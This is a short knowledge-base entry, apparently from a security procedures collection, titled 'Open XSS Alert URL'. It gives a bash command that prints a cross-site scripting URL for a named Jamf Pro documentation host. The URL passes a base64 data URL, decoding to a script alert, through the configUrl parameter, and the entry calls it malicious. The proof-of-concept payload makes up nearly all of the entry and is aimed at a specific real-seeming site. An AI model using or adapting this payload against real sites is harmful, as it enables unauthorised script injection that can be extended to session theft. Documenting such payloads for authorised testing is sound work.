---
data: >-
  echo
  'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,encoded-alert-payload'
tags:
  - xss
type: command
executor: bash
platforms:
  - Web
id: 490087a9-fb1a-4fb7-9aa7-5cb9ab482a77
created_at: '2025-12-13T23:56:20.465Z'
updated_at: '2025-12-13T23:56:20.465Z'
verified: false
validated: true
submitted: true
---
# Open XSS Alert URL

## Command

```bash
echo 'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,encoded-alert-payload'
```

## Description

This command outputs a malicious URL that, when opened in a browser, exploits XSS to display an alert.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `configUrl` | Data URL with base64 payload | Yes |

## Examples

### Basic Usage

```bash
echo 'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='
```

## Expected Output

URL string to copy and open in browser, resulting in JS alert.

## Related

- [[procedures/Craft-XSS-Payload-for-Alert]]
